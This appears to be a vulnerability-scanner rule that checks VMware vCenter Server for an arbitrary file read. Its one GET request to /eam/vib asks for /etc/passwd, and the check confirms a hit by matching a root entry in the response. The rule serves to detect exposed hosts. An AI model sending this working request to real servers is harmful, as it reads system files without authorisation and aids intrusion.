name: poc-yaml-vmware-vcenterserveranyfile-read-linux
rules:
  - method: GET
    path: /eam/vib?id=/etc/passwd
    follow_redirects: false
    expression: |
      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
